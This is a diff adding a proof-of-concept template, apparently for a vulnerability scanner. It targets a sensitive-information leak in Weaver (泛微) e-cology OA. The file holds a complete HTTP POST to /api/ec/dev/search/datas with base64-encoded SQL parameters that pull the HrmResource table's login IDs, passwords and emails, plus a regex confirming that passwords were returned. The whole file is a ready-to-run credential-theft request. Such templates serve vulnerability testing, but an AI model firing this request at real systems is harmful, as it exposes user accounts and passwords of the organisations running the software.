@@ -1,0 +1,17 @@
+﻿<DudePoc_Name>泛微 e-cology datas 存在敏感信息泄漏漏洞</DudePoc_Name>
+<DudePoc_Description>泛微 e-cology datas 存在敏感信息泄漏漏洞 ，攻击者通过漏洞可以获取OA中的用户敏感信息</DudePoc_Description>
+<DudePoc_SetHeader>
+POST /api/ec/dev/search/datas HTTP/1.1
+Host: $<AttackHost>$
+Referer: $<AttackReferer>$/
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+type=&sqlParams={"tFields":"Kg==","tFrom":"SHJtUmVzb3VyY2U=","tOrder":"aWQ=","tWhere":""}&columns=[{"dataIndex":"loginid"},{"dataIndex":"password"},{"dataIndex":"email"},{"dataIndex":"id"}]&sumCloumns=&min=0&max=100
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>200</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData>^(?=.*?datas)(?=.*?id)(?=.*?password).*?$</DudePoc_VerifyData>
+<DudePoc_VerifyFile></DudePoc_VerifyFile>
+<DudePoc_AttackCode></DudePoc_AttackCode>
